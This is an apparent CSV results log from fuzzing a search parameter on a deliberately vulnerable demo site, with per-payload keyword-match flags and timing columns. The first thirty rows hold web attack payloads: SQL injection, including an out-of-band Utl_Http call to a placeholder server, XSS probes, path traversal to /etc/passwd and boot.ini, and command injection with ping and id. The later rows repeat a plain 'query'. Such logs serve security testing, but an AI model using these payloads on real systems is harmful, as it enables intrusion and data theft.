id_fuzz,#,URL,Method,StatusCode,SearchKeyword_error,SearchKeyword_exception,SearchKeyword_illegal,SearchKeyword_invalid,SearchKeyword_fail,SearchKeyword_stack,SearchKeyword_access,SearchKeyword_directory,SearchKeyword_file,SearchKeyword_not found,SearchKeyword_unknown,SearchKeyword_uid=,SearchKeyword_c:\,SearchKeyword_varchar,SearchKeyword_ODBC,SearchKeyword_SQL,SearchKeyword_quotation mark,SearchKeyword_syntax,SearchKeyword_ORA-,SearchKeyword_111111,SearchKeyword_test,SearchKeyword_test2,SearchKeyword_'--,TimeDelay,ContentLength
1,id_fuzz_1,http://testphp.vulnweb.com/search.php?test='--,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,0,0
2,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=' or 1=1--,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
3,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=' or 1 in (@@version)--,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
4,id_fuzz_1,http://testphp.vulnweb.com/search.php?test='; waitfor delay '0:30:0'--,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
5,id_fuzz_1,http://testphp.vulnweb.com/search.php?test='||Utl_Http.request('http://<yourservername>') from dual--,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
6,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=xsstest,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
7,id_fuzz_1,"http://testphp.vulnweb.com/search.php?test=xsstest%00""<>'",POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
8,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=</foo>,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
9,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=../../../../../../../../../../etc/passwd,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
10,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=../../../../../../../../../../boot.ini,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
11,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=..\..\..\..\..\..\..\..\..\..\etc\passwd,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
12,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=..\..\..\..\..\..\..\..\..\..oot.ini,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
13,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=|| ping -i 30 127.0.0.1 ; x || ping -n 30 127.0.0.1 &,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,0,0
14,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=| ping -i 30 127.0.0.1 |,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
15,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=| ping -n 30 127.0.0.1 |,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
16,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=& ping -i 30 127.0.0.1 &,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
17,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=& ping -n 30 127.0.0.1 &,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
18,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=; ping 127.0.0.1 ;,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
19,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=%0a ping -i 30 127.0.0.1 %0a,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
20,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=`ping 127.0.0.1`,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
21,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=| id,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,0,0
22,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=& id,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
23,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=; id,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
24,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=%0a id %0a,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
25,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=`id`,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
26,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=;echo 111111,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
27,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=echo 111111,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
28,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=response.write 111111,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
29,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=:response.write 111111,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
30,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=http://<yourservername>/,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
31,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=query,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,1,1,0
32,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=query,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
33,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=query,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
34,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=query,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,1,1,0
35,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=query,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,1,0,0
36,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=query,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
37,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=query,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
38,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=query,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
39,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=query,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
40,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=query,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
41,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=query,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
42,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=query,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
43,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=query,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
44,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=query,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,0,0
45,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=query,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
46,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=query,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
47,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=query,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
48,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=query,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
49,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=query,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,0,0
50,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=query,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
51,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=query,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
52,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=query,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
53,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=query,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
54,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=query,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
55,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=query,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
56,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=query,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,1,1,0,0,1,0
57,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=query,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,1,1,0,0,1,0
58,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=query,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,1,1,0,0,1,0
59,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=query,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,1,1,0,0,1,0
60,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=query,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
61,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=query,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
62,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=query,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
63,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=query,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
64,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=query,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
65,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=query,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
66,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=query,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
67,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=query,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
68,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=query,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
69,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=query,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
70,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=query,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
71,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=query,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
72,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=query,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
73,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=query,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
74,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=query,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
75,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=query,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
76,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=query,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
77,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=query,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
78,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=query,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
79,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=query,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
80,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=query,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
81,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=query,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
82,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=query,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
83,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=query,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
84,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=query,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
85,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=query,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
86,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=query,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
87,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=query,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
88,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=query,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
89,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=query,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
90,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=query,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
